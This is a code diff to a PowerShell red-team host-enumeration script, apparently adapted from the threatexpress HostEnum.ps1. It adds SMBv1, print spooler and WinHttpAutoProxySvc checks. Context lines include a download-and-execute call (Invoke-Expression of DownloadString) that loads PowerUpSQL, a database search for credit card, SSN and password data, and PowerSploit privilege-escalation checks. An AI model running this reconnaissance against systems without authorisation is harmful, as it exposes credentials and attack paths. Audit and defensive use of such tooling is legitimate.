@@ -27,7 +27,7 @@ function Get-LocalPasswordNotRequired {
 }
 function Get-SysInfo {
     <#
-    https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
+    Modified https://github.com/threatexpress/red-team-scripts/blob/master/HostEnum.ps1
     .SYNOPSIS
     Get basic system information from the host
     #>
@@ -61,10 +61,11 @@ function Get-SysInfo {
         LocalDCOM               = ((Get-LocalDCOM).name -join ', ')
         LocalRDP                = ((Get-LocalRDP).name -join ', ')
         LocalPasswordNotReq     = ((Get-LocalPasswordNotRequired).name -join ', ')
+        SMBv1                   = [bool](Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol)
     }      
     # PS feels the need to randomly re-order everything when converted to an object so let's presort
     $SysInfoObject = New-Object -TypeName PSobject -Property $SysInfoHash 
-    return $SysInfoObject | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, IPAddresses, Domain, Username, LogonServer, DotNetVersion, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, LSASSProtection, LAPS, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, DENYRDPCONNECTIONS, LOCALADMINS,LocalPSRemote,LocalDCOM,LocalRDP,LocalPasswordNotReq     
+    return $SysInfoObject | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, IPAddresses, Domain, Username, LogonServer, DotNetVersion, PSVersion, PSCompatibleVersions, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir, PSModuleLogging, LSASSProtection, LAPS, UACLocalAccountTokenFilterPolicy, UACFilterAdministratorToken, DENYRDPCONNECTIONS, LOCALADMINS,LocalPSRemote,LocalDCOM,LocalRDP,LocalPasswordNotReq, SMBv1    
 }
 function Get-LocalSecurityProducts {
     <#
@@ -1458,7 +1459,7 @@ function Invoke-HostEnum {
     (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" | where {$_.DisplayName} | Select-Object DisplayName, Publisher, InstallDate)
     $mssql = Get-WmiObject -Class Win32_Service  -Filter "Name='MSSQLSERVER'"
     if($mssql){
-        Write-Output "`n[*] Starting MSSQL Audit"
+        Write-Output "[*] Starting MSSQL Audit"
         try{
             Invoke-Expression (New-Object System.Net.WebClient).DownloadString($PowerUpSQL)
             $check = $true
@@ -1505,7 +1506,7 @@ function Invoke-HostEnum {
                         #acl for database path
                         $instanceinfo | Get-SQLDatabase | Sort-Object -Unique -Property FileName | foreach {Get-ModifiablePath -Path $_.FileName -ErrorAction Continue | Format-List}
                         #search database for keywords in non default databases
-                        $instanceinfo | Get-SQLColumnSampleDataThreaded -Threads 20 -Keyword "credit,ssn,password" -SampleSize 2 -ValidateCC -NoDefaults | Format-List
+                        #$instanceinfo | Get-SQLColumnSampleDataThreaded -Threads 20 -Keyword "credit,ssn,password" -SampleSize 2 -ValidateCC -NoDefaults | Format-List
                 }else{
                     Write-Output "[-] Cant Enumerate Instance $($Instance.Instance)"
                 }
@@ -1513,7 +1514,7 @@ function Invoke-HostEnum {
         }
     }
     if(Test-Path "HKLM:\SOFTWARE\Microsoft\InetStp\"){
-        Write-Output "`n[*] Starting IIS testing"
+        Write-Output "[*] Starting IIS testing"
         #https://powersploit.readthedocs.io/en/latest/Privesc/Get-WebConfig/
         Write-Output "[*] Checking WebConfig"
         try{
@@ -1541,16 +1542,18 @@ function Invoke-HostEnum {
             Write-Output "[-] ApplicationHost Failed"
         }
     }
+    Write-Output "[*] Print Spooler Status"
+    (Get-WmiObject -Class Win32_Service  -Filter "Name='Spooler'" | Format-Table Name,DisplayName,Status,State,StartMode)
+    Write-Output "[*] Checking WinHttpAutoProxySvc Status"
+    (Get-WmiObject -Class Win32_Service  -Filter "Name='WinHttpAutoProxySvc'" | Format-Table Name,DisplayName,Status,State,StartMode)
     $OSinfo = (Get-CimInstance -ClassName Win32_OperatingSystem).ProductType
     if($OSinfo -eq 1){
-        Write-Output "`n[*] Starting Workstation testing"
+        Write-Output "[*] Starting Workstation testing"
         Write-Output "[*] PowerShell Version 2: $((Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2).state)"
     }else{
-        Write-Output "`n[*] Starting Server testing"
+        Write-Output "[*] Starting Server testing"
         Write-Output "[*] Starting Windows Defender Audit"
         Invoke-DefenderEnum
-        Write-Output "[*] Print Spooler Status"
-        (Get-WmiObject -Class Win32_Service  -Filter "Name='Spooler'" | Format-Table Name,DisplayName,Status,State,StartMode)
         Write-Output "[*] PowerShell Version 2: $((Get-WindowsFeature PowerShell-V2 -ErrorAction SilentlyContinue).InstallState)"
     }
 }
